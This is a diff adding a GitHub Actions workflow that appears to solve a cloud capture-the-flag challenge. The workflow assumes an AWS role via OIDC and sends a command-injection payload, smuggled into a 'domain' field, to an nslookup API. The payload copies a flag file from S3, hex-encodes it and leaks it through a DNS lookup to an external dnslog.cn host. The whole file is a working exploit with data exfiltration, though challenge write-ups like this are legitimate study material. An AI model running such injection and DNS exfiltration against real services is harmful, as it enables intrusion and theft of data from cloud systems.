@@ -1,0 +1,34 @@
+name: Cloud Escape Stage 1 - Flag Retrieval (DNS Exfil)
+on:
+  push:
+    branches: [corgi]
+  workflow_dispatch:
+
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  capture-flag:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Configure AWS Credentials via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
+          aws-region: us-east-1
+
+      - name: Inject DNS Exfiltration Command
+        run: |
+          pip install awscurl -q
+          API_ID="3q931syi7b"
+          URL="https://${API_ID}.execute-api.us-east-1.amazonaws.com/dev/nslookupv2"
+          
+          # The payload will read the flag, encode it in hex to make it a valid subdomain, 
+          # and then do a DNS lookup on it via the VPC Resolver
+          cat << 'EOF' > payload.json
+          {"domain": "; /opt/aws s3 cp s3://codec4f26c862a321ef5/flag.txt /tmp/flag.txt; FLAG=$(python3 -c 'import binascii; print(binascii.hexlify(open(\"/tmp/flag.txt\",\"rb\").read()).decode())'); /opt/nslookup $FLAG.ixz9wv.dnslog.cn"}
+          EOF
+          
+          echo "Triggering DNS exfiltration..."
+          awscurl --service execute-api --region us-east-1 -X POST "$URL" -H "Content-Type: application/json" -d @payload.json
